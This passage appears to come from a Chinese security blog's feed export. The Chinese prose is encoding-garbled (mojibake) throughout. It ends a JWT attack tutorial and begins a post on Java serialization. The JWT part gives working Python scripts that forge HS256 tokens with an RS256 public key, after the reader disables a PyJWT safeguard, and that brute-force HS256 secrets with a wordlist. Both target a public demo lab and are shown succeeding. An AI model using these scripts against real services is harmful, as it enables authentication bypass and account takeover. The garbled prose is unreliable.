<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210306152239.png" alt="image-20210306151222844"></p>
<p>è¿è¡Œè„šæœ¬ï¼ˆæ‰“é¶åœºæ—¶è¯·å°†{â€¦}ä¸­çš„å€¼ä¿®æ”¹ï¼Œå¦‚æœæ‚¨ç°åœ¨æäº¤ï¼Œå®ƒå°†å¤±è´¥ï¼Œå› ä¸ºå®ƒå·²ç»è¿‡æœŸï¼‰</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author : yhy</span></span><br><span class="line"><span class="comment"># jwt éå¯¹ç§°åŠ å¯†ï¼Œæ”¹ä¸ºå¯¹ç§°åŠ å¯† ï¼Œéœ€è¦å…¬é’¥</span></span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">public = <span class="built_in">open</span>(<span class="string">&#x27;public.pem&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read() <span class="comment"># å…¬é’¥</span></span><br><span class="line"><span class="built_in">print</span>(jwt.encode(&#123;</span><br><span class="line">  <span class="string">&quot;iss&quot;</span>: <span class="string">&quot;http://demo.sjoerdlangkemper.nl/&quot;</span>,</span><br><span class="line">  <span class="string">&quot;iat&quot;</span>: <span class="number">1615015143</span>,</span><br><span class="line">  <span class="string">&quot;exp&quot;</span>: <span class="number">1615016343</span>,</span><br><span class="line">  <span class="string">&quot;data&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;JWT&quot;</span>: <span class="string">&quot;RS256 -&gt; HS256 test &quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;, key=public, algorithm=<span class="string">&#x27;HS256&#x27;</span>))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m pip install PyJWT</span><br><span class="line">python3 jwt_test.py</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210306152213.png" alt="image-20210305211926691"></p>
<p>å¦‚æœå‡ºç°ä»¥ä¸Šé”™è¯¯ï¼Œè¯·æ‰§è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m pip uninstall jwt</span><br><span class="line">python3 -m pip uninstall PyJWT</span><br><span class="line">python3 -m pip install PyJWT</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œ</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210306152614.png" alt="image-20210305213239054"></p>
<p>æŸ¥èµ„æ–™è¯´æ˜¯å› ä¸ºjwtæ¨¡å—æ›´æ–°åï¼Œä¸ºäº†é˜²æ­¢æ»¥ç”¨ï¼ŒåŠ å…¥äº†å¼ºæ ¡éªŒï¼Œå¦‚æœæŒ‡å®šç®—æ³•ä¸º HS256 è€Œæä¾› RSA çš„å…¬é’¥ä½œä¸º key æ—¶ä¼šæŠ¥é”™ï¼Œæ— æ³•å¾€ä¸‹æ‰§è¡Œï¼Œéœ€è¦æ³¨é‡Šæ‰ <strong>site-packages&#x2F;jwt&#x2F;algorithms.py</strong> ä¸­çš„å¦‚ä¸‹äº”è¡Œï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210306152610.png" alt="image-20210305213418057"></p>
<p>æˆåŠŸè¿è¡Œ</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210306152104.png" alt="image-20210306152103157"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vZGVtby5zam9lcmRsYW5na2VtcGVyLm5sLyIsImlhdCI6MTYxNTAxNTE0MywiZXhwIjoxNjE1MDE2MzQzLCJkYXRhIjp7IkpXVCI6IlJTMjU2IC0-IEhTMjU2IHRlc3QgIn19.HWN7y4FVaRZMNHiCWwcGuEOruLpPYKw_UOtNj4iXbC8</span><br></pre></td></tr></table></figure>

<p>æäº¤JWTï¼Œæ”»å‡»æˆåŠŸ</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210306152109.png" alt="image-20210306152039256"></p>
<h4 id="3-4-æš´åŠ›ç ´è§£å¯†é’¥"><a href="#3-4-æš´åŠ›ç ´è§£å¯†é’¥" class="headerlink" title="3.4 æš´åŠ›ç ´è§£å¯†é’¥"></a>3.4 æš´åŠ›ç ´è§£å¯†é’¥</h4><p>å½“ alg æŒ‡å®š HMAC ç±»å¯¹ç§°åŠ å¯†ç®—æ³•æ—¶ï¼Œå¯ä»¥è¿›è¡Œé’ˆå¯¹ key çš„æš´åŠ›ç ´è§£ï¼Œæ¯”å¦‚å½“ç®—æ³•ä¸ºHS256ï¼ŒHS256ç®—æ³•ä½¿ç”¨å¯†é’¥å¯¹æ¶ˆæ¯è¿›è¡Œç­¾åå’ŒéªŒè¯ï¼Œå¦‚æœçŸ¥é“å¯†é’¥ï¼Œåˆ™å¯ä»¥åˆ›å»ºè‡ªå·±çš„ç­¾åæ¶ˆæ¯ã€‚æ‰€æœ‰å½“å¯†é’¥ä¸å¤Ÿç‰¢å›ºæ—¶ï¼Œåˆ™å¯ä»¥ä½¿ç”¨è›®åŠ›æˆ–<a href="https://github.com/wallarm/jwt-secrets">å­—å…¸</a>æ”»å‡»å°†å…¶ç ´è§£ã€‚</p>
<p>é¶åœºï¼š<a href="http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php">http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php</a></p>
<p>ä½¿ç”¨pythonè„šæœ¬è¿›è¡Œå­—å…¸ç ´è§£ï¼Œå°†ä¸‹æ–¹çš„ jwt_json æ¢æˆè‡ªå·±çš„å€¼ï¼Œå­—å…¸å¯ä»¥ä» <a href="https://github.com/wallarm/jwt-secrets">https://github.com/wallarm/jwt-secrets</a> è·å– </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author : yhy</span></span><br><span class="line"><span class="comment"># jwt æš´åŠ›ç ´è§£è„šæœ¬</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">jwt_json=<span class="string">&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTYxNTAyMTAzNiwiZXhwIjoxNjE1MDIyMjM2LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0.x_ENVoZZRSDnjUqKHOAOYvTDrAtzfLw-_i02Qqry7so&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;jwt.secrets.list&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        key = line.strip()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            jwt.decode(jwt_json, verify=<span class="literal">True</span>, key=key, algorithms=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;found key! --&gt; &#x27;</span> +  key)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>(jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;found key! --&gt; &#x27;</span> +  key)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>(jwt.exceptions.InvalidSignatureError):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;verify key! --&gt;&#x27;</span> + key)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;key not found!&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œ</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210306170654.png" alt="image-20210306165921066"></p>
<p>çˆ†ç ´å‡ºå¯†é’¥ä¸ºï¼š<code>secret</code>ï¼Œå€ŸåŠ© <a href="https://jwt.io/#debugger">https://jwt.io/#debugger</a>  å³å¯è¿›è¡Œæ¶ˆæ¯çš„æ¶æ„ä¼ªé€ ï¼Œç¯¡æ”¹ï¼Œ</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210306170702.png" alt="image-20210306165956842"></p>
<p>å°†å·¦ä¾§ jwt å¤åˆ¶å‘é€ï¼Œæ”»å‡»æˆåŠŸ</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210306170715.png" alt="image-20210306170013690"></p>
<p>å­—å…¸è·‘ä¸å‡ºæ—¶ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ <a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a>  å·¥å…·è¿›è¡Œæš´åŠ›ç ´è§£</p>
]]></content>
      <categories>
        <category>Webæ¸—é€</category>
      </categories>
      <tags>
        <tag>Webæ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title>åˆæ¢Javaååºåˆ—åŒ–æ¼æ´(ä¸€)</title>
    <url>/2021/04/16/%E5%88%9D%E6%8E%A2Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(%E4%B8%80)/</url>
    <content><![CDATA[<blockquote>
<p>  å­¦æ— æ­¢å¢ƒï¼Œå‚è€ƒç€èµ„æ–™è¾¹å­¦è¾¹è®°å½•å§ã€‚</p>
</blockquote>
<h2 id="0x01-Javaåºåˆ—åŒ–ä¸ååºåˆ—åŒ–"><a href="#0x01-Javaåºåˆ—åŒ–ä¸ååºåˆ—åŒ–" class="headerlink" title="0x01 Javaåºåˆ—åŒ–ä¸ååºåˆ—åŒ–"></a>0x01 Javaåºåˆ—åŒ–ä¸ååºåˆ—åŒ–</h2><p><strong>Javaåºåˆ—åŒ–</strong>æ˜¯æŒ‡æŠŠJavaå¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚åºåˆ—çš„è¿‡ç¨‹ã€‚è¿™ä¸€è¿‡ç¨‹å°†æ•°æ®åˆ†è§£æˆå­—èŠ‚æµï¼Œä»¥ä¾¿å­˜å‚¨åœ¨æ–‡ä»¶ä¸­æˆ–åœ¨ç½‘ç»œä¸Šä¼ è¾“ï¼›</p>
<p><strong>Javaååºåˆ—åŒ–</strong>æ˜¯æŒ‡æŠŠå­—èŠ‚åºåˆ—æ¢å¤ä¸ºJavaå¯¹è±¡çš„è¿‡ç¨‹ã€‚å°±æ˜¯æ‰“å¼€å­—èŠ‚æµå¹¶é‡æ„æˆå¯¹è±¡ï¼Œæ¢å¤æ•°æ®ã€‚</p>
<p>åºåˆ—åŒ–ä¸ååºåˆ—åŒ–éƒ½å¯ä»¥ç†è§£ä¸ºâ€œå†™â€å’Œâ€œè¯»â€æ“ä½œ ï¼Œé€šè¿‡ä»¥ä¸‹è¿™ä¸¤ä¸ªæ–¹æ³•å¯ä»¥å°†å¯¹è±¡å®ä¾‹è¿›è¡Œâ€œåºåˆ—åŒ–â€ä¸â€œååºåˆ—åŒ–â€æ“ä½œã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å†™å…¥å¯¹è±¡å†…å®¹</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream out)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// è¯»å–å¯¹è±¡å†…å®¹</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream in)</span></span><br></pre></td></tr></table></figure>

<h2 id="0x02-ä¸ºä»€ä¹ˆéœ€è¦åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"><a href="#0x02-ä¸ºä»€ä¹ˆéœ€è¦åºåˆ—åŒ–ä¸ååºåˆ—åŒ–" class="headerlink" title="0x02 ä¸ºä»€ä¹ˆéœ€è¦åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"></a>0x02 ä¸ºä»€ä¹ˆéœ€è¦åºåˆ—åŒ–ä¸ååºåˆ—åŒ–</h2><p>å½“ä¸¤ä¸ªè¿›ç¨‹è¿›è¡Œè¿œç¨‹é€šä¿¡æ—¶ï¼Œå¯ä»¥ç›¸äº’å‘é€å„ç§ç±»å‹çš„æ•°æ®ï¼ŒåŒ…æ‹¬æ–‡æœ¬ã€å›¾ç‰‡ã€éŸ³é¢‘ã€è§†é¢‘ç­‰ï¼Œ è€Œè¿™äº›æ•°æ®éƒ½ä¼šä»¥äºŒè¿›åˆ¶åºåˆ—çš„å½¢å¼åœ¨ç½‘ç»œä¸Šä¼ é€ã€‚è€Œå½“ä¸¤ä¸ªJavaè¿›ç¨‹è¿›è¡Œé€šä¿¡æ—¶ï¼Œå¯ä»¥é€šè¿‡Javaçš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–åœ¨è¿›ç¨‹ä¹‹é—´ç›´æ¥ä¼ é€å¯¹è±¡ï¼Œæ¢å¥è¯è¯´ï¼Œå‘é€æ–¹éœ€è¦æŠŠè¿™ä¸ªJavaå¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚åºåˆ—ï¼Œç„¶ååœ¨ç½‘ç»œä¸Šä¼ é€ï¼›æ¥æ”¶æ–¹éœ€è¦ä»å­—èŠ‚åºåˆ—ä¸­æ¢å¤å‡ºJavaå¯¹è±¡ã€‚</p>
<p>ä½¿ç”¨åœºæ™¯ï¼š</p>
<ul>
<li><p>æƒ³æŠŠå†…å­˜ä¸­çš„å¯¹è±¡ä¿å­˜åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­æˆ–è€…æ•°æ®åº“ä¸­æ—¶å€™ï¼›</p>
</li>
<li><p>æƒ³ç”¨å¥—æ¥å­—åœ¨ç½‘ç»œä¸Šä¼ é€å¯¹è±¡çš„æ—¶å€™ï¼›</p>
</li>
<li><p>æƒ³é€šè¿‡RMIä¼ è¾“å¯¹è±¡çš„æ—¶å€™</p>
</li>
</ul>
<p>ä¸€äº›åº”ç”¨åœºæ™¯æ¶‰åŠåˆ°å°†å¯¹è±¡è½¬åŒ–æˆäºŒè¿›åˆ¶ï¼Œåºåˆ—åŒ–ä¿è¯äº†èƒ½å¤ŸæˆåŠŸè¯»å–åˆ°ä¿å­˜çš„å¯¹è±¡ã€‚</p>
<p>æ€»ä¹‹ï¼Œåºåˆ—åŒ–çš„ç”¨é€”å°±æ˜¯ä¼ é€’å’Œå­˜å‚¨ã€‚</p>
<h2 id="0x03-åºåˆ—åŒ–å®ç°çš„æ–¹å¼"><a href="#0x03-åºåˆ—åŒ–å®ç°çš„æ–¹å¼" class="headerlink" title="0x03 åºåˆ—åŒ–å®ç°çš„æ–¹å¼"></a>0x03 åºåˆ—åŒ–å®ç°çš„æ–¹å¼</h2><h3 id="3-1-Serializable"><a href="#3-1-Serializable" class="headerlink" title="3.1 Serializable"></a>3.1 Serializable</h3><p>å°†è¦åºåˆ—åŒ–çš„ç±»å®ç° <code>Serializabel</code> æ¥å£ï¼ˆSerializableæ¥å£æ˜¯ä¸€ä¸ªæ ‡è®°æ¥å£ï¼Œä¸ç”¨å®ç°ä»»ä½•æ–¹æ³•ã€‚ä¸€æ—¦å®ç°äº†æ­¤æ¥å£ï¼Œåˆ™è¡¨æ˜è¯¥ç±»çš„å¯¹è±¡å°±æ˜¯å¯åºåˆ—åŒ–çš„ï¼‰ï¼Œè€Œä¸”æ‰€æœ‰å±æ€§å¿…é¡»æ˜¯å¯åºåˆ—åŒ–çš„ï¼Œå°±æ˜¯å¦‚æœä¸€ä¸ªå¯åºåˆ—åŒ–çš„ç±»çš„æˆå‘˜ä¸æ˜¯åŸºæœ¬ç±»å‹ï¼Œä¹Ÿä¸æ˜¯Stringç±»å‹ï¼Œæ¯”å¦‚è‡ªå·±è‡ªå®šä¹‰çš„ç±»ï¼Œé‚£è¿™ä¸ªå¼•ç”¨ç±»å‹ä¹Ÿå¿…é¡»æ˜¯å¯åºåˆ—åŒ–çš„ï¼Œå¦åˆ™ï¼Œä¼šå¯¼è‡´æ­¤ç±»ä¸èƒ½åºåˆ—åŒ–(ç”¨<code>transient</code>å…³é”®å­—ä¿®é¥°çš„å±æ€§é™¤å¤–ï¼Œä¸å‚ä¸åºåˆ—åŒ–è¿‡ç¨‹) ã€‚</p>
<p><strong>éœ€è¦åºåˆ—åŒ–çš„ç±»</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> yhy;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/4/4 21:46</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åºåˆ—åŒ–</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> yhy;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/4/4 22:14</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åºåˆ—åŒ–å’Œååºåˆ—åŒ–</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserSerializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user.setName(<span class="string">&quot;yhy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åºåˆ—åŒ–ï¼Œ å°†å¯¹è±¡è½¬åŒ–ä¸ºå­—èŠ‚åºåˆ—</span></span><br><span class="line">        serialize(user);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(User user)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;user.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fout);</span><br><span class="line">        out.writeObject(user);</span><br><span class="line">        out.close();</span><br><span class="line">        fout.close();</span><br><span class="line">        System.out.println(<span class="string">&quot;åºåˆ—åŒ–å®Œæˆ.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°è¿è¡Œåï¼Œç”Ÿäº§äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œå°†<code>user</code> å¯¹è±¡å˜æˆäº†å¯æŒä¹…åŒ–å­˜å‚¨çš„äºŒè¿›åˆ¶æ•°æ®ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210405211458.png" alt="image-20210404222530833"></p>
<p>å¯ä»¥æ¥çœ‹ä¸€ä¸‹è¯¥å¯¹è±¡åºåˆ—åŒ–åçš„äºŒè¿›åˆ¶æ•°æ®</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210405211505.png" alt="image-20210404223840477"></p>
<p>åºåˆ—åŒ–çš„æ•°æ®æµä»¥é­”æœ¯æ•°å­—å’Œç‰ˆæœ¬å·å¼€å¤´ï¼Œè¿™ä¸ªå€¼æ˜¯åœ¨è°ƒç”¨<code>ObjectOutputStream</code>åºåˆ—åŒ–æ—¶ï¼Œç”±<code>writeStreamHeader</code>æ–¹æ³•å†™å…¥ã€‚å¼€å¤´çš„å‡ ä½ä¸€èˆ¬æ¥å½“ä½œJavaåºåˆ—åŒ–å­—èŠ‚çš„ç‰¹å¾ã€‚</p>
<p><strong>ååºåˆ—åŒ–</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> yhy;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/4/4 22:14</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åºåˆ—åŒ–å’Œååºåˆ—åŒ–</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserSerializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user.setName(<span class="string">&quot;yhy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åºåˆ—åŒ–ï¼Œ å°†å¯¹è±¡è½¬åŒ–ä¸ºå­—èŠ‚åºåˆ—</span></span><br><span class="line"><span class="comment">//        serialize(user);</span></span><br><span class="line">        <span class="comment">// ååºåˆ—åŒ–ï¼Œå°†å­—èŠ‚åºåˆ—æ¢å¤ä¸ºå¯¹è±¡</span></span><br><span class="line">        <span class="type">User</span> <span class="variable">user1</span> <span class="operator">=</span> unserialize();</span><br><span class="line">        System.out.println(user1.getName());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> User <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;user.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileIn);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">        fileIn.close();</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210405211519.png" alt="image-20210404224748419"></p>
<p>è¯»å–äº†åºåˆ—åŒ–æ–‡ä»¶ï¼Œå°†äºŒè¿›åˆ¶æ–‡ä»¶é‡æ–°æ¢å¤ä¸º<code>user</code>å¯¹è±¡ï¼Œå¯¹è±¡é‡Œé¢çš„å±æ€§ä¹Ÿæ˜¯å®Œç¾æ¢å¤ã€‚</p>
<h3 id="3-2-Externalizable"><a href="#3-2-Externalizable" class="headerlink" title="3.2 Externalizable"></a>3.2 Externalizable</h3><p>é€šè¿‡å®ç°<code>Externalizable</code>æ¥å£è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—èƒ¡ï¼Œä½†å¿…é¡»å®ç°<code>writeExternal</code>ã€<code>readExternal</code>æ–¹æ³•ï¼Œå¹¶ä¸”è¿˜è¦å®ç°ä¸€ä¸ªç±»çš„<strong>æ— å‚æ„é€ æ–¹æ³•</strong>ï¼Œ<code>Serializable</code> æ¥å£å¯ä»¥ä¸ç”¨å®ç°ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> yhy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Externalizable;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInput;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/4/5 00:24</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">implements</span> <span class="title class_">Externalizable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®ç°äº†Externalizableè¿™ä¸ªæ¥å£éœ€è¦æä¾›æ— å‚æ„é€ ï¼Œåœ¨ååºåˆ—åŒ–æ—¶ä¼šæ£€æµ‹</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.getClass() + <span class="string">&quot;çš„EvilClass()æ— å‚æ„é€ æ–¹æ³•è¢«è°ƒç”¨!!!!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeExternal</span><span class="params">(ObjectOutput out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">     </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç”¨æ³•å’Œå®ç°äº†<code>Serializable</code>æ¥å£ä¸€æ ·ï¼Œè¿™é‡Œå°±ä¸æ¼”ç¤ºäº†ã€‚</p>
